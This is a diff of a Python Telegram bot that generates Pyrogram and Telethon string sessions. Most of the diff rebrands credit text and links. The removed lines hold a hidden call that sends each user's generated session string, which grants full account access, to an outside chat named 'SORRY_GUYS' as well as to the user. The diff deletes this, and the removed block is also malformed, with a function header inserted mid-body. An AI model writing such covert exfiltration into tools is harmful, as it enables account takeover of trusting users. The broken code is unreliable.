@@ -34,11 +34,11 @@ import config
 
 
 
-ask_ques = "**☞︎︎︎ ᴄʜᴏᴏsᴇ ᴏɴᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ  𖤍 ✔️ **"
+ask_ques = "**☞︎︎︎ ᴄʜᴏᴏsᴇ ᴏɴᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ 𖤍 ✔️ **"
 buttons_ques = [
     [
         InlineKeyboardButton("▪️ᴘʏʀᴏɢʀᴀᴍ▪️", callback_data="pyrogram"),
-        InlineKeyboardButton("▪️ᴘʏʀᴏɢʀᴀᴍ ᴠ2 ▪️", callback_data="pyrogram"),
+        InlineKeyboardButton("▪️ᴘʏʀᴏɢʀᴀᴍ ᴠ2▪️", callback_data="pyrogram"),
     ],
     [
         InlineKeyboardButton("🔺ᴛᴇʟᴇᴛʜᴏɴ🔺", callback_data="telethon"),
@@ -51,7 +51,7 @@ buttons_ques = [
 
 gen_button = [
     [
-        InlineKeyboardButton(text="❃𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐒𝐄𝐒𝐒𝐈𝐎𝐍❃", callback_data="generate")
+        InlineKeyboardButton(text="🔹ɢᴇɴʀᴀᴛᴇ sᴇssɪᴏɴ🔹", callback_data="generate")
     ]
 ]
 
@@ -174,32 +174,17 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         string_session = client.session.save()
     else:
         string_session = await client.export_session_string()
-    text = f"**ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n**ɢᴇɴʀᴀᴛᴇᴅ ʙʏ :[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) ᴡᴀʀɴɪɴɢ :** ᴅᴏɴᴛ sʜᴀʀᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴇᴠᴇɴ ɪғ ᴡɪᴛʜ ʏᴏᴜʀ ɢғ 🏴‍☠️"
-async def send_messages_and_disconnect(msg):
+    text = f"**ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n**ɢᴇɴʀᴀᴛᴇᴅ ʙʏ :[𝐓ᴇᴀᴍ 𝐏ᴜʀᴠɪ](https://t.me/purvi_support) ᴡᴀʀɴɪɴɢ :** ᴅᴏɴᴛ sʜᴀʀᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴇᴠᴇɴ ɪғ ᴡɪᴛʜ ʏᴏᴜʀ ɢғ 🏴‍☠️"
     try:
-        # Check if `client` is a bot or not
         if not is_bot:
-            await client.send_message("me", text)  # Send to saved messages
-            await client.send_message("SORRY_GUYS", text)  # Send to specific chat
+            await client.send_message("me", text)
         else:
-            # Ensure msg is passed and has correct chat ID
-            if msg and hasattr(msg, 'chat') and hasattr(msg.chat, 'id'):
-                await bot.send_message(msg.chat.id, text)  # Send to the initiating chat
-            else:
-                print("Message or Chat ID not found")
-    except Exception as e:
-        print(f"Error in sending message: {e}")
-
+            await bot.send_message(msg.chat.id, text)
+    except KeyError:
+        pass
     await client.disconnect()
+    await bot.send_message(msg.chat.id, "sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\nᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ [𝐀ʟᴘʜᴀ 𝐁ᴀʙʏ](https://t.me/KING_STRING_SESSION_BOT)".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
 
-    # Ensure disconnection logic follows message sending
-    if msg and hasattr(msg, 'chat') and hasattr(msg.chat, 'id'):
-        await bot.send_message(
-            msg.chat.id,
-            "sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\n"
-            "ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\n"
-            "ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ [𝐀ʟᴘʜᴀ ʙᴀʙʏ](https://t.me/ll_ALPHA_BABY_lll)".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ")
-        )
 
 async def cancelled(msg):
     if "/cancel" in msg.text:
